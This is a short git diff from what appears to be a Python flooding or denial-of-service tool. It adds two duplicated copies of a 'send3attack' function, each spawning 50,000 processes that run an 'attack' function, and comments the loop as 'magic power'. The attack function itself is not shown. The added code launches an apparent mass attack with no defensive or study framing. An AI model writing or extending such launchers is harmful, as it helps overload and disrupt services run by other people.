@@ -106,6 +106,26 @@ def send3attack():
     
 send3attack()
 
+def send3attack():
+  for i in range(50000): #Poder mágico
+    mp = multiprocessing.Process(target=attack)
+    mp.setDaemon = False
+    mp.start() #Magic Starts
+    sleep(2)
+	
+    
+send3attack()
+
+def send3attack():
+  for i in range(50000): #Poder mágico
+    mp = multiprocessing.Process(target=attack)
+    mp.setDaemon = False
+    mp.start() #Magic Starts
+    sleep(2)
+	
+    
+send3attack()
+
 exit(1)
 
 def progressbar(it, prefix="", size=60, file=sys.stdout):
